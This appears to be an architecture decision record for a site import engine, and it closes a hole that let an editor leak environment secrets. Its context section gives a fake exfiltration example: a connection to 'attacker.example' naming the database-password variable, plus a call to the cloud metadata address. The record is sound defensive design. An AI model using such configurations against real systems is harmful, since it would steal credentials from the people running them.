# 24. Where an import may send a secret, and where it may go

Date: 2026-10-12 · Status: accepted · Qualifies ADR 0005 and ADR 0022

## Context
ADR 0005 and 0022 say that secrets never leave the environment: a definition stores the *name* of an environment variable, and the authentication plugin sends its value in a header. A review of the engine found that this holds only as long as the person who edits a definition is trusted not to try. Someone with `administer import definitions` chooses the name of the variable *and* the address it is sent to. A connection to `https://attacker.example` with `env_var: SITE_B_DB_PASSWORD` sends the database password there on the next run, or on "Try the source", which also shows the answer. The same person can make the engine call `http://169.254.169.254/`, where cloud servers keep their credentials.

The permission is marked `restrict access`, so this is a risk of a mistake or of one compromised editor, not of anonymous users. It still contradicts what the decisions promise.

## Decision
- **Only a variable that says it holds a key can be named**: the name ends in `_API_KEY`, `_TOKEN`, `_SECRET` or `_KEY` and has no word about the database, a password, a salt, root or admin. This is checked in the configuration schema (so the wizard, the connection form and `cim` all refuse it) *and* again when the secret is read, since configuration can be imported without being validated. A refused name never reaches the environment, and the message names the variable and never a value.
- **A redirect is not followed.** Guzzle only removes `Authorization` and `Cookie` when the host changes; a header like `api-key` is sent on. A 3xx is a permanent error that says so. This is the same rule that `NextUrlPagination` already has for links in a response.
- **Addresses that are never a source are refused before a request**: other schemes than http and https, the link-local ranges (where cloud metadata is), `0.0.0.0/8` and the unspecified address. The host name is resolved first, so a name that points at such an address is caught. **Private networks stay allowed**, because that is where sources are (a DDEV site, a service in the same cluster, which is how site B reads site A). The ranges can be replaced in `settings.php` (`$settings['import_engine_blocked_networks']`).
- **No credentials in the configuration**: a URL cannot have a user name and password, and the headers of a source cannot be named like a credential (`Authorization`, `Cookie`, anything with `key`, `token`, `secret`, `password` or `auth` in it). The way to authenticate is the authentication plugin. A user name in an address that was stored anyway is left out of messages.

## Consequences
- **A name like `SITE_A_API_KEY` keeps working**; one like `ADMIN_TOKEN_DB` does not. A variable that is allowed by name but holds something else is not something the engine can tell; the convention is the protection.
- **The name check is a guard, not a wall.** Anyone who can set variables, change the settings or run code can do more than this. What it stops is a definition being used to move a secret that was never meant for an import.
- **A name that resolves to a safe address and changes its answer before the request is not caught** (DNS rebinding). Closing that needs a network policy, which belongs to the place the engine runs in, and the Kubernetes manifests do not have one yet.
- **Existing definitions with a name that is now refused fail their run with a clear message** instead of sending the value.
